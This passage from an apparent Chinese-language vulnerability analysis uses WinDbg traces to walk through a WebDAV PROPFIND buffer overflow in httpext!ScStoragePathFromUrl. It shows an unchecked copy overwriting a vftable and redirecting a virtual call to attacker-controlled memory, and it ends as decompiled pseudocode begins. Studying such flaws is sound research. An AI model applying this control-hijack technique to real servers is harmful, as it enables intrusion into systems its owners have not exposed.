<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x334</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">faf</span> <span class="n">f3a5</span>            <span class="n">rep</span> <span class="n">movs</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="o">:[</span><span class="n">edi</span><span class="o">],</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">esi</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">esi</span>
<span class="n">esi</span><span class="o">=</span><span class="mi">00</span><span class="n">fff35c</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">esi</span>
<span class="mi">00</span><span class="n">fff35c</span>  <span class="mi">003</span><span class="n">a0063</span> <span class="mi">0069005</span><span class="n">c</span> <span class="mi">0065006</span><span class="n">e</span> <span class="mi">00700074</span>  <span class="n">c</span><span class="o">.:.\.</span><span class="n">i</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">e</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff36c</span>  <span class="mi">00620075</span> <span class="mi">0077005</span><span class="n">c</span> <span class="mi">00770077</span> <span class="mi">006</span><span class="n">f0072</span>  <span class="n">u</span><span class="o">.</span><span class="na">b</span><span class="o">.\.</span><span class="n">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">o</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff37c</span>  <span class="mi">0074006</span><span class="n">f</span> <span class="mi">0062005</span><span class="n">c</span> <span class="mi">00620062</span> <span class="mi">00620062</span>  <span class="n">o</span><span class="o">.</span><span class="na">t</span><span class="o">.\.</span><span class="n">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff38c</span>  <span class="mi">00620062</span> <span class="mi">61757948</span> <span class="mi">6</span><span class="n">f674f43</span> <span class="mi">48456</span><span class="n">b6f</span>  <span class="n">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">HyuaCOgookEH</span>
</pre></div>


<p>这次memcpy拷贝过程中，会将esi寄存器中的值拷贝到edi寄存器中，可以看到edi寄存器的值是0x680312c0，这个值很有意思，在之前我提到过，这个buffer的值会在外层函数中申请，并存放在栈中，因此正常情况应该是向一个栈地址拷贝，而这次为什么会向一个堆地址拷贝呢？</p>
<p>这是个悬念，也是我觉得这个利用巧妙的地方，下面我们先进入后面的分析，在memcpy中，也就是rep movs中ecx的值决定了memcpy的长度，第一次拷贝的长度是0x9。</p>
<p>接下来，回进入第二次拷贝，这次拷贝的长度就比较长了。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//长度相减，0x2fd－0x0</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fc4</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x349</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fc4</span> <span class="mi">2</span><span class="n">bda</span>            <span class="n">sub</span>     <span class="n">ebx</span><span class="o">,</span><span class="n">edx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">ebx</span>
<span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">edx</span>
<span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fc6</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x34b</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fc6</span> <span class="mi">8</span><span class="n">d3456</span>          <span class="n">lea</span>     <span class="n">esi</span><span class="o">,[</span><span class="n">esi</span><span class="o">+</span><span class="n">edx</span><span class="o">*</span><span class="mi">2</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fc9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x34e</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fc9</span> <span class="mi">8</span><span class="n">b95b0fbffff</span>    <span class="n">mov</span>     <span class="n">edx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">450</span><span class="n">h</span><span class="o">]</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00</span><span class="n">fff348</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fcf</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x354</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fcf</span> <span class="mi">8</span><span class="n">d3c10</span>          <span class="n">lea</span>     <span class="n">edi</span><span class="o">,[</span><span class="n">eax</span><span class="o">+</span><span class="n">edx</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="o">/</span><span class="err">／</span><span class="n">ecx的值为dword值</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fd2</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x357</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fd2</span> <span class="mi">8</span><span class="n">d4c1b02</span>        <span class="n">lea</span>     <span class="n">ecx</span><span class="o">,[</span><span class="n">ebx</span><span class="o">+</span><span class="n">ebx</span><span class="o">+</span><span class="mi">2</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">000005</span><span class="n">fc</span> <span class="n">edx</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fd6</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x35b</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fd6</span> <span class="mi">8</span><span class="n">bc1</span>            <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="err">／／最后拷贝的长度再除以</span><span class="mi">4</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000005</span><span class="n">fc</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">000005</span><span class="n">fc</span> <span class="n">edx</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fd8</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x35d</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fd8</span> <span class="n">c1e902</span>          <span class="n">shr</span>     <span class="n">ecx</span><span class="o">,</span><span class="mi">2</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="o">/</span><span class="err">／这次拷贝</span><span class="mi">17</span><span class="n">f的值</span> <span class="n">key</span><span class="err">！！！看</span><span class="n">ecx</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000005</span><span class="n">fc</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0000017</span><span class="n">f</span> <span class="n">edx</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">e4</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fdb</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x360</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fdb</span> <span class="n">f3a5</span>            <span class="n">rep</span> <span class="n">movs</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="o">:[</span><span class="n">edi</span><span class="o">],</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">esi</span><span class="o">]</span>
</pre></div>


<p>可以看到，这次拷贝的长度是0x17f，长度非常大，而在整个分析的过程中，并没有对拷贝的长度进行控制，因此，可以拷贝任意超长的字符串，进入这个堆空间。</p>
<p>这个堆空间非常有意思，存放的是一个vftable，这个vftable会在ScStorageFromUrl函数中的某个内层函数调用调用到，还记得之前分析的ScStripAndCheckHttpPrefi函数吗。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//正常情况ScStripAndCheckHttpPrefix函数中对vftable的获取</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff9a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">c648</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00605740</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">e8</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x13</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">e8</span> <span class="mi">8</span><span class="n">b07</span>            <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">edi</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00605740</span><span class="o">={</span><span class="n">httpext</span><span class="o">!</span><span class="n">CEcb</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">&#39;</span> <span class="o">(</span><span class="mi">67113</span><span class="n">bc8</span><span class="o">)}</span>
</pre></div>


<p>获取完虚表之后，会获取到对应的虚函数，在ScStripAndCheckHttpPrefix函数中call调用到。但是由于之前的memcpy覆盖，导致这个vftable被覆盖。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">f0</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x1b</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">f0</span> <span class="mi">8955</span><span class="n">f4</span>          <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">0</span><span class="n">Ch</span><span class="o">],</span><span class="n">edx</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00</span><span class="n">fff4c4</span><span class="o">=</span><span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//eax是vftable，而call [eax+24]调用虚函数，这里由于之前的覆盖，导致跳转到可控位置</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">f3</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x1e</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">f3</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">24</span><span class="n">h</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">680313</span><span class="n">e4</span><span class="o">=</span><span class="mi">68016082</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">eax</span>
<span class="mi">680313</span><span class="n">c0</span>  <span class="mi">680313</span><span class="n">c0</span> <span class="mi">68006</span><span class="n">e4f</span> <span class="mi">68006</span><span class="n">e4f</span> <span class="mi">766</span><span class="n">a4247</span>  <span class="o">...</span><span class="n">hOn</span><span class="o">.</span><span class="na">hOn</span><span class="o">.</span><span class="na">hGBjv</span>
<span class="mi">680313</span><span class="n">d0</span>  <span class="mi">680313</span><span class="n">c0</span> <span class="mi">4</span><span class="n">f744257</span> <span class="mi">52345947</span> <span class="mi">4</span><span class="n">b424b66</span>  <span class="o">...</span><span class="n">hWBtOGY4RfKBK</span>
</pre></div>


<p>这个漏洞的原理非常简单，在PROPFIND中，由于对http的长度没有进行检查，导致在memcpy中，可以拷贝超长的字符串，覆盖到栈中的关键位置，下面来看一下伪代码。</p>
<div class="codehilite"><pre><span></span><span class="kr">__int32</span> <span class="kr">__fastcall</span> <span class="nf">ScStoragePathFromUrl</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">IEcb</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="n">a3</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a4</span><span class="p">,</span> <span class="k">struct</span> <span class="n">CVRoot</span> <span class="o">**</span><span class="n">a5</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">v35</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="n">Str</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
  <span class="n">v37</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">;</span>
  <span class="n">v34</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
  <span class="n">v33</span> <span class="o">=</span> <span class="n">a5</span><span class="p">;</span>
